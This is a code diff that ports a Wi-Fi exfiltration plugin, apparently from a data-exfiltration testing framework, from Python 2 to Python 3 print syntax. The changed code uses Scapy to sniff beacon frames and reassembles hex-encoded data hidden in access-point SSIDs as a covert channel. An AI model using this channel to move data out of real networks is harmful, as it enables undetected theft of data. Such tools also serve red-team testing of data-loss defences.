@@ -1,7 +1,9 @@
+from __future__ import print_function
+
 try:
     from scapy.all import *
 except:
-    print "You should install Scapy if you run the server.."
+    print("You should install Scapy if you run the server..")
 
 config = None
 app_exfiltrate = None
@@ -15,17 +17,17 @@ def PacketHandler(pkt):
         if pkt.type == 00 and pkt.subtype == 8:
             if pkt.addr2 not in ap_list:
                 ap_list.append(pkt.addr2)
-                print "AP MAC: {} with SSID: {}".format(pkt.addr2, pkt.info)
+                print("AP MAC: {} with SSID: {}".format(pkt.addr2, pkt.info))
                 try:
                     data = pkt.info.decode('hex')
                     if len(ap_buffer) == 0:
                         job_id = data[:7]
-                    print "job_id : {}".format(job_id)
+                    print("job_id : {}".format(job_id))
                     ap_buffer.append(data)
-                    print ap_buffer
+                    print(ap_buffer)
                     try:
                         data_to_exfil = ''.join(ap_buffer)
-                        print "data_to_exfil = {}".format(data_to_exfil)
+                        print("data_to_exfil = {}".format(data_to_exfil))
                         if len(pkt.info) < 30:
                             data_to_exfil = ''.join(ap_buffer)
                             app_exfiltrate.retrieve_data(data_to_exfil)
@@ -35,10 +37,10 @@ def PacketHandler(pkt):
                             app_exfiltrate.retrieve_data(packet_exfil)
                             ap_buffer = data_to_exfil.split(packet_exfil, '')
                     except Exception as err:
-                        print err
+                        print(err)
                         pass
                 except Exception as err:
-                    print err
+                    print(err)
                     pass
 
 def send(data):
@@ -71,7 +73,7 @@ def send(data):
         sendp(frame, iface=iface, inter=1)
 
 def listen():
-    print config['interface']
+    print(config['interface'])
     app_exfiltrate.log_message('info', "[wifi] Waiting for Wi-Fi probe on {}".format(config['interface']))
     sniff(iface=str(config['interface']), prn=PacketHandler)    
     # sniff(iface="wlan1mon", prn=PacketHandler)
